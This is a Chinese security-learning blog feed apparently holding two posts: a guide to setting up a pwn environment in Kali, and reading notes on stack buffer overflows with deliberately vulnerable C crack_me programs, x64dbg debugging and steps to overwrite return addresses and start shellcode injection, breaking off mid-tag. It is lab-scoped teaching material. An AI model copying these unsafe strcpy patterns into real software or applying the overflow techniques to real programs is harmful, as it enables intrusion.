    <url>/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h2 id="在Kali下快速配置一个简单的PWN环境"><a href="#在Kali下快速配置一个简单的PWN环境" class="headerlink" title="在Kali下快速配置一个简单的PWN环境"></a>在Kali下快速配置一个简单的PWN环境</h2><p>多次搭建了，但是忘性太大了每次都去搜索，感觉很慢，所以就自己写一个集中一点🤣</p><span id="more"></span><h3 id="Kali下载"><a href="#Kali下载" class="headerlink" title="Kali下载"></a>Kali下载</h3><p>官网下载实在是太慢了，所以我选择百度网盘，因为我是会员😎</p><p>这里贴上我的网盘链接：<a href="https://pan.baidu.com/s/1UP7BzYkHBv54v3_bZjWmxQ">Kali-Liunx-2023.3-VM</a></p><p>提取码：xiyq</p><p>然后VM里打开就OK了，然后就入，默认账密：kali&#x2F;kali</p><h3 id="root-换源"><a href="#root-换源" class="headerlink" title="root&amp;&amp;换源"></a>root&amp;&amp;换源</h3><h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p>进去之后当然不是root权限，当然不爽啦吗，右键打开终端，然后输入kali的密码kali，切换到root用户，修改root用户密码，然后重启以root身份登入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">su root<br>passwd<br>reboot<br></code></pre></td></tr></table></figure><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><p>然后就是换源，一个是apt源，一个是pip源</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">//换apt源<br>vim /etc/apt/sources.list<br>//deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<br>apt-get update<br>apt-get upgrade<br>//换pip源<br><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">mkdir</span> .pip<br><span class="hljs-built_in">cd</span> .pip<br>vim pip.conf<br>/*<br>[global]<br><span class="hljs-built_in">timeout</span> = 6000<br>index-url = https://pypi.tuna.tsinghua.edu.cn/simple/<br>[install]<br>trusted-host=https://pypi.tuna.tsinghua.edu.cn<br>*/<br></code></pre></td></tr></table></figure><p><img src="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/Snipaste_2023-12-03_22-00-47.png"></p><p><img src="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/Snipaste_2023-12-03_22-01-46.png"></p><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>安装pwntools，在本kali下是python3了，所以其实是安装pwn库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install pwn<br></code></pre></td></tr></table></figure><p>没啥问题</p><p><img src="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/Snipaste_2023-12-03_21-58-31.png"></p><h3 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h3><p>安装pwndbg，pwndbg其实是原生gdb的一个插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">mkdir</span> pwn<br><span class="hljs-built_in">cd</span> pwn<br>git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br>gdb<br></code></pre></td></tr></table></figure><p>安装完即可！😀</p><p><img src="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/Snipaste_2023-12-03_22-00-12.png"></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件与系统安全</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔2</title>
    <link href="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/"/>
    <url>/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔2"><a href="#0Day安全软件漏洞分析第2版阅读随笔2" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔2"></a>0Day安全软件漏洞分析第2版阅读随笔2</h1><p>开启第二章的阅读，栈溢出基本原理！</p><p>程序中所使用的缓冲区可以是堆区、栈区和存放静态变量的数据区。本章主要介绍在系统栈中发生溢出的情形。</p><p>Impossible-&gt;I’m possible😎</p><span id="more"></span><h2 id="第二章-栈溢出原理与实践"><a href="#第二章-栈溢出原理与实践" class="headerlink" title="第二章-栈溢出原理与实践"></a>第二章-栈溢出原理与实践</h2><h3 id="系统栈的工作原理"><a href="#系统栈的工作原理" class="headerlink" title="系统栈的工作原理"></a>系统栈的工作原理</h3><h4 id="操作系统的内存"><a href="#操作系统的内存" class="headerlink" title="操作系统的内存"></a>操作系统的内存</h4><p>进程使用内存可以按照功能可以非常简单地分为以下4个部分（实际上的内存远没有这么简单）：</p><ul><li><p>代码区：<strong>存放二进制机器码</strong>，CPU在此处取指并执行。PE文件的代码段中包含的二进制机器码会被装入内存的代码区（.text）</p></li><li><p>数据区：存放<strong>全局变量</strong></p></li><li><p>堆区：进程可以在堆区动态地请求一定大小的内存，用完后还给堆区。<strong>动态分配和回收是堆区的特点</strong>。</p></li><li><p>栈区：用于动态存储函数之间的调用关系，以保证被调函数在返回时恢复到母函数中继续执行。</p></li></ul><h4 id="系统栈、函数栈帧"><a href="#系统栈、函数栈帧" class="headerlink" title="系统栈、函数栈帧"></a>系统栈、函数栈帧</h4><p>​首先栈是一种数据结构，这个肯定都知道啦🤣两种操作，PUSH和POP，存在栈顶TOP和栈底BASE，一般来说，TOP是动态的，BASE是静态的。</p><p>​内存中的栈区实际上就是系统栈，是系统实现的一种管理函数调用的数据结构，由系统自动维护。</p><p>​不同的操作系统在函数调用的规定上是不同的，如果要明确使用某一种调用约定，需要在函数前加上调用约定的声明。默认情况下，采用<code>_stdcall</code>这种方式。</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-10-30_10-13-07.png"></p><p>​而函数的调用就是通过系统栈的来实现的，当一个新的函数被调用时，会为其开辟一个新的栈帧，OS会进行以下操作：</p><ol><li>按规定顺序压入函数参数</li><li>压入返回地址，一般为函数调用指令的地址</li><li>此时CPU开始读取新的代码区的指令</li><li>压入当前栈帧的栈底指针值（EBP）</li><li>EBP&lt;&#x3D;ESP，此时EBP指向的内存位置存储的是源函数的栈底指针值</li><li>ESP&#x3D;ESP-所需空间</li></ol><p>汇编伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH arg3;<br>PUSH arg2;<br>PUSH arg1;<br>CALL func; //此时压入返回地址，代码区转换<br>PUSH EBP;<br>MOV  EBP,ESP;<br>SUB  ESP,EBX;//假设EBX为需要的内存大小,静态变量使用内存大小的确定在编译器编译时就已经确定了<br></code></pre></td></tr></table></figure><p>当函数调用完成时，</p><ol><li>返回值存放在EAX寄存器</li><li>ESP&#x3D;ESP+占用内存大小</li><li>EBP&#x3D;(EBP)</li><li>函数返回值addr弹回，EIP&#x3D;addr</li></ol><p>汇编伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ADD  ESP,EBX;<br>MOV  EBP,(EBP);<br>POP  EBP;<br>RETN; <br></code></pre></td></tr></table></figure><p><a href="https://gitbook.coder.cat/function-call-principle/content/storage-of-local-variables.html">关于局部变量的存储</a>，这里书里没有讲，寄存器和内存都可以用来存放<code>函数执行时</code>所需的<code>数据</code>。寄存器的存取速度比内存快很多，所以通常会优先把数据存入寄存器中。但是由于寄存器数量有限，因此当寄存器不够用时会将数据存放在栈内存中。</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-10-30_11-14-28.png"></p><h3 id="修改临界变量"><a href="#修改临界变量" class="headerlink" title="修改临界变量"></a>修改临界变量</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在系统栈中存在某一种可能的情况，局部变量紧挨着排列，当局部变量中存在数组之类的缓冲区时，并且在赋值时数组可以发生越界，那么越界的数组元素可能破坏相邻变量的值，甚至当紧挨着<code>EBP</code>时，从而修改<code>EBP</code>、返回地址等等。</p><h4 id="crack-me2"><a href="#crack-me2" class="headerlink" title="crack_me2"></a>crack_me2</h4><p>人为制造溢出：</p><p>注意<code>buffer</code>的声明位置</p><p>我们的目标是溢出到返回值，让其返回1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">&quot;3xsh0re&quot;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLAG     <span class="hljs-string">&quot;flag&#123;stack_overflow_right?&#125;&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>&#123; <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">8</span>];<span class="hljs-comment">// add local buffto be overflowed </span><br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>&#125; <br>main() <br>&#123; <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) <br>    &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input password: &quot;</span>); <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,password); <br>        valid_flag = verify_password(password); <br>        <span class="hljs-keyword">if</span>(valid_flag) <br>        &#123; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;incorrect password!\n\n&quot;</span>); <br>        &#125; <br>   <span class="hljs-keyword">else</span> <br>        &#123; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulation! You have got the flag:%s\n&quot;</span>,FLAG); <br>            <span class="hljs-keyword">break</span>; <br>        &#125; <br>    &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p>此时笔者转去学习<code>x64dbg</code>了，不然用起来很不顺手🤣，如果需要了解简单的用法，见上一篇博客</p><p>浅浅学习归来，</p><p>首先将程序拖进<code>x64dbg</code>，然后寻找验证函数的位置，在此模块搜索字符串，然后定位到大致位置</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-30-13.png"></p><p>分析一下：大概在读取输入之后，调用了地址<code>0000000000401550</code>处的函数，找到该处</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-32-16.png"></p><p>挺近的，可以发现<code>push rbp</code>压入栈底，然后在call完<code>strcpy</code>函数后打下断点</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-34-18.png"></p><p>那么我们先运行程序到输入密码处，然后输入密码，开始调试程序</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-01_21-22-37.png"></p><p>进入断点，此时我们知道存在一个<code>strcpy</code>函数，那么之后会有一个返回值，在内存中找到返回值的地方，选中上断点的反汇编代码，然后在详细信息表格中双击将要写入eax寄存器的那个内存的地址，然后会在内存试图里显示，由于我这里输入的是<code>xxxxxxx</code>，所以值是1，当然不能通过验证</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-52-58.png"></p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-58-52.png"></p><p>如果我们输入8个<code>x</code>呢，可以发现，返回标志被溢出的换行符替换为0了，即可通过验证！</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-56-38.png"></p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_16-00-03.png"></p><p>至于为什么是8个<code>x</code>，其实很好理解，因为定义的是一个8个字符的数组哒！刚好最后一个截断字符溢出哒！</p><p>刚好我们人为制造的字符数组和Auth相邻哒！</p><p>但是你会意外的发现，如果输入字符串小于<code>3xsh0re</code>，即使输入8个字符也不能冲破验证，这是因为小于则<code>strcmp</code>函数的返回值为-1，那么就会导致Auth的值为0xFFFFFFFF，就算淹没了两个字节变为0xFFFFFF00也无济于事的🤣</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_16-17-24.png"></p><p>当然笔者这里还有一个办法，想办法在输入中跟上7个截断字符，刚好淹没所有的Auth，当然这里在命令行里输入不太方便，然后笔者发现在之后的crack实验，我们通过文件读取的方式可以实现！😎</p><h3 id="控制程序执行的流程"><a href="#控制程序执行的流程" class="headerlink" title="控制程序执行的流程"></a>控制程序执行的流程</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>​我们通过上面的学习，已经知道利用栈溢出可以修改邻接变量，更通用、更强大的攻击通过缓冲区溢出改写的目标往往不是某一个变量，而是瞄准栈帧最下方的 EBP 和函数返回地址等栈帧状态值。</p><h4 id="crack-me3"><a href="#crack-me3" class="headerlink" title="crack_me3"></a>crack_me3</h4><p>​用键盘输入字符的 ASCII 表示范围有限，很多值（如 0x11、0x12 等符号）无法直接用键盘输入，所以我们把用于实验的代码稍作改动，将程序的输入由键盘改为从文件中读取字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">&quot;3xsh0re&quot;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>&#123; <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">8</span>]; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>&#125; <br>main() <br>&#123; <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    FILE * fp; <br>    <span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">&quot;password.txt&quot;</span>,<span class="hljs-string">&quot;rw+&quot;</span>))) <br>    &#123; <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>    &#125; <br>    <span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">&quot;%s&quot;</span>,password); <br>    valid_flag = verify_password(password); <br>    <span class="hljs-keyword">if</span>(valid_flag) <br>    &#123; <br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;incorrect password!\n&quot;</span>); <br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123; <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); <br>    &#125; <br>    fclose(fp); <br>&#125;<br></code></pre></td></tr></table></figure><p>将上面的代码编译为exe，然后在同级目录下创建password.txt文件。</p><p>在动手之前，理清思路：</p><p>1.我们需要摸清楚栈中的状况</p><p>2.破解目标是通过密钥验证，所以应该知道密钥验证通过的指令地址</p><p>3.通过文件缓冲区溢出在返回地址处填上地址</p><p>通过x64dbg打开之前的编译好的文件，找到验证通过的指令地址。可以通过右键查找用户模块字符串快速找到。</p><p>可以得到地址为0x0000 0000 0040 161B，这里因为是在x86-64下，地址为64位，不同于书上是32位的。那么我们之后覆盖的返回值地址就是这里了😋</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_11-14-28.png"></p><p>然后我们找到缓冲区的位置，首先在password.txt里输入“1234”，然后在通过调试在验证函数的下面这个地方打上断点：</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_18-11-03.png"></p><p>然后在堆栈区找到我们的缓冲区地址：我们这里是0000 0000 0061 F9D0，可以发现其中填充的是“34333231”，正是我们的输入。</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_18-13-46.png"></p><p>接下来就是制作我们的payload了，从上面的图可以发现，要淹没返回值需要5*4个无效字节加上构造的返回值地址，这里为什么是5个不是6个，因为对于双字数据，在内存中的存放按照从地址低到高这里也就是1234，而在作为数值时是从高到低的，这是由于调试器的原因会在堆栈区按数值显示，也就是对于00..061F9D0的偏移在栈中是7-&gt;0，所以是填充6个。</p><p>使用winhex编辑txt文件的16进制，内容如下：</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-19-01.png"></p><p>然后运行，成功！</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-21-12.png"></p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-20-10.png"></p><h3 id="在缓冲区植入代码"><a href="#在缓冲区植入代码" class="headerlink" title="在缓冲区植入代码"></a>在缓冲区植入代码</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>我们已经完成修改返回地址的壮举！😋那么我们为何不将返回地址改到我们自己的输入上呢，这样不就可以执行我们自己的代码了，那么我们的代码放哪，放缓冲区噻，之前填充的是无用的数值，填充指令不就可以了。</p><h4 id="crack-me4"><a href="#crack-me4" class="headerlink" title="crack_me4"></a>crack_me4</h4><p>和实验3一样通过文件读取，不过改了缓冲区大小，加入了包含窗口调用dll。目的是在缓冲区填充弹窗的代码！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span> <span class="hljs-comment">//包含user32.dll</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">&quot;3xsh0re&quot;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>&#123; <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">44</span>]; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>&#125; <br>main() <br>&#123; <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    FILE * fp; <br>    LoadLibrary(<span class="hljs-string">&quot;user32.dll&quot;</span>);<span class="hljs-comment">//prepare for messagebox </span><br>    <span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">&quot;password.txt&quot;</span>,<span class="hljs-string">&quot;rw+&quot;</span>))) <br>    &#123; <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>    &#125; <br>    <span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">&quot;%s&quot;</span>,password); <br>    valid_flag = verify_password(password); <br>    <span class="hljs-keyword">if</span>(valid_flag) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;incorrect password!\n&quot;</span>); <br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); <br>    &#125; <br>    fclose(fp); <br>&#125;<br></code></pre></td></tr></table></figure><p>和之前一样需要获得函数调用在内存中的返回返回到缓冲区的地址，打开x64dbg，开调！</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-56-32.png"></p><p>根据之前的调试方法，我们可以找到缓冲区的地址：0000 0000 0061 F9B0，接下来就需要我们编写password.txt里的内容了，肯定是要淹没到返回地址的位置的，看看上面的堆栈信息，可以发现我们需要设置7*12345678+缓冲区地址。在Winhex里编辑如下：</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-29-16.png"></p><p>调试一下，发现成功淹没</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-31-00.png"></p><p>接下来就是编写我们植入的代码，我们需要定位到内存中MessageBox的地址，这里不沿用书的方法，我们直接在x64dbg中查看符号文件，搜索即可得到地址为：0x00007FFB294DA000</p><p><img 